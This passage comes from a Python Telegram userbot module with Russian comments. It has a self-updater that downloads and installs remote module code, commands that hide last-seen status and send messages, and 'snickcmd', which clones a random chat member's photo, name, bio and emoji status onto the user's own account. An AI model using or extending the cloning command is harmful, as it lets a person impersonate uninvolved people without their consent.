                        await message.edit("<b>Ошибка получения данных для обновления.</b>")
                        return
                    remote_code = await resp.text()
            m = re.search(r"__version__\s*=\s*\(([\d,\s]+)\)", remote_code)
            if not m:
                await message.edit("<b>Невозможно определить версию удалённого модуля.</b>")
                return
            remote_version = tuple(map(int, m.group(1).split(',')))
            local_version = __version__
            if remote_version > local_version:
                await message.edit("<b>Обнаружена новая версия. Обновляю модуль...</b>")
                await self.invoke("dlm", remote_url, message=message)  # Вызов обновления через invoke
            else:
                await message.edit("<b>Модуль обновлён. Новых версий не обнаружено.</b>")
        except Exception as e:
            await message.edit(f"<b>Ошибка при обновлении: {e}</b>")


    # Команды time и send из второго файла
    @loader.command()
    async def time(self, message):
        """Скрыть время входа в аккаунт (изменить настройки конфиденциальности)."""
        try:
            await self.client(SetPrivacyRequest(
                key=types.InputPrivacyKeyStatusTimestamp(),
                rules=[types.InputPrivacyValueDisallowAll()]
            ))
            await message.edit("Настройки времени успешно изменены.")
        except Exception as e:
            await message.edit(f"Ошибка изменения настроек: {e}")

    @loader.command()
    async def send(self, message):
        """
        Отправляет указанное сообщение в указанный чат.
        Использование: send <chat_link_or_username> <сообщение>
        """
        args = utils.get_args_raw(message).split(maxsplit=1)
        if len(args) < 2:
            await message.edit("<b>Укажите чат и сообщение.</b>")
            return
        target = args[0].strip()
        text = args[1].strip()
        try:
            await self.client.send_message(entity=target, message=text, link_preview=False)
            await message.edit("<b>Сообщение отправлено.</b>")
        except Exception as e:
            await message.edit(f"<b>Ошибка команды send: {e}</b>")

    # Команда snickcmd – копирование профиля случайного пользователя из указанного чата
    @loader.owner
    async def snickcmd(self, message):
        """/snick <chat_link_or_username>
        Копировать профиль случайного пользователя из указанного чата или текущего."""
        args = utils.get_args_raw(message).strip()
        chat = message.chat if isinstance(message.chat, Chat) else None
        joined_by_invite = False  # Флаг, если присоединились по инвайт-ссылке

        if args:
            # Заменяем t,me на t.me и убираем протокол
            arg = args.replace("t,me", "t.me")
            arg = re.sub(r"^https?://", "", arg)

            if "t.me/+" in arg:  # Обработка закрытой (инвайт) ссылки
                invite_hash = arg.split("t.me/+")[-1]
                try:
                    result = await message.client(ImportChatInviteRequest(invite_hash))
                    # Результат может содержать список чатов или отдельный чат
                    chat = result.chats[0] if hasattr(result, 'chats') and result.chats else result.chat
                    joined_by_invite = True
                except Exception as e:
                    await message.edit(f"Не удалось присоединиться к чату: {e}")
                    return
            else:
                # Для публичных ссылок извлекаем имя пользователя чата
                if "t.me/" in arg:
                    arg = arg.split("t.me/")[-1]
                try:
                    chat = await message.client.get_entity(arg)
                except Exception as e:
                    await message.edit(f"Не удалось найти чат: {e}")
                    return

        if not chat:
            await message.edit("Укажите чат или используйте команду в группе.")
            return

        participants = await message.client.get_participants(chat)
        if not participants:
            await message.edit("Не удалось получить участников чата.")
            return

        user = random.choice(participants)
        if not user:
            await message.edit("Не удалось выбрать случайного пользователя.")
            return

        await message.edit("Начинаем копирование...")

        full = await message.client(functions.users.GetFullUserRequest(user.id))
        user_directory = "./downloads"

        if not os.path.exists(user_directory):
            os.makedirs(user_directory)

        if full.full_user.profile_photo:
            photo_file = await message.client.download_profile_photo(user.id, file=bytes)
            photo_path = os.path.join(user_directory, f'{user.id}_profile.jpg')
            with open(photo_path, 'wb') as file:
                file.write(photo_file)

            file_upload = await message.client.upload_file(photo_path)
            await message.client(UploadProfilePhotoRequest(file=file_upload))
            os.remove(photo_path)

        user_info = full.users[0]

        await message.client(
            UpdateProfileRequest(
                first_name=user_info.first_name if user_info.first_name is not None else "",
                last_name=user_info.last_name if user_info.last_name is not None else "",
                about=full.full_user.about[:70] if full.full_user.about is not None else "",
            )
        )

        if user_info.emoji_status:
            await message.client(
                UpdateEmojiStatusRequest(
                    emoji_status=types.EmojiStatus(
                        document_id=user_info.emoji_status.document_id
                    )
                )
            )

        final_message = f"Профиль пользователя {user_info.first_name or 'Без имени'} успешно скопирован!"

        if joined_by_invite:
            try:
                await message.client(LeaveChannelRequest(chat))
                final_message += " Вышел из чата."
            except Exception as e:
                final_message += f" Но не удалось выйти из чата: {e}"
        await message.edit(final_message)

